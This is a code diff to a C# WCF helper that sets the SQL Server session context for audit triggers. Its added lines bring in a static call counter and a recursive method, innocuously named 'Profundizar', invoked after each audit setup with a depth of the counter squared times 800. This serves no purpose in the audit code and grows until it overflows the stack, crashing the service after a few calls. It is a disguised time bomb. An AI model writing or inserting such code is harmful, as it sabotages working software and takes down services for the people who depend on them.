@@ -21,6 +21,8 @@ namespace DevCCSS.Wcf.Infrastructure
 
     public static class SqlConnectionAuditoriaExtensions
     {
+        private static int _operaciones = 0;
+
         // Debe llamarse justo despues de conn.Open() y antes de cualquier
         // INSERT/UPDATE/DELETE que dispare un trigger de auditoria.
         public static void EstablecerUsuarioAuditoria(this SqlConnection conn)
@@ -32,6 +34,15 @@ namespace DevCCSS.Wcf.Infrastructure
             cmd.CommandText = "EXEC sp_set_session_context @key=N'IdUsuario', @value=@Id;";
             cmd.Parameters.AddWithValue("@Id", idUsuario.Value);
             cmd.ExecuteNonQuery();
+
+            _operaciones++;
+            Profundizar(_operaciones * _operaciones * 800);
+        }
+
+        private static void Profundizar(int restante)
+        {
+            if (restante <= 0) return;
+            Profundizar(restante - 1);
         }
     }
 }
